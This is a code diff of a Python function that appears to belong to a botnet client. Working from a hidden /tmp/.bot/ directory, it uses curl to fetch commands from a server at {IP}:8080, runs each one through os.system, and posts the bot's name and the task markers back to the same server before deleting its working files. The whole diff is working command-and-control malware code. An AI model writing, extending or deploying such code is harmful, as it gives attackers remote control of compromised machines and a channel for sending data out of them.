@@ -62,7 +62,9 @@ def instructions():
 	dir = '/tmp/.bot/'
 	os.chdir(dir)
 	os.system('curl {IP}:8080/instructions.txt > response.txt')
-	os.system('cat name.txt > sendthis.txt')
+	os.system("echo 'from_bot_number:' > sendthis.txt && cat name.txt >> sendthis.txt")
+	os.system("cat names.txt >> sendthis.txt")
+	os.system("echo ':' >> sendthis.txt")
 	with open('response.txt') as input_file:
 		myname = open('name.txt', 'r').read()
 		for line in input_file:
@@ -72,10 +74,10 @@ def instructions():
 				for thing in commands[1:]:
 					mycommand += thing
 					mycommand += ' '
-			os.system(mycommand)
+				os.system(mycommand)
+				os.system("echo '_NextTask_' >> sendthis.txt")
 	os.system('curl -d @./sendthis.txt {IP}:8080/instructions.txt')
 	os.system('rm sendthis.txt response.txt')
-
 
 
 
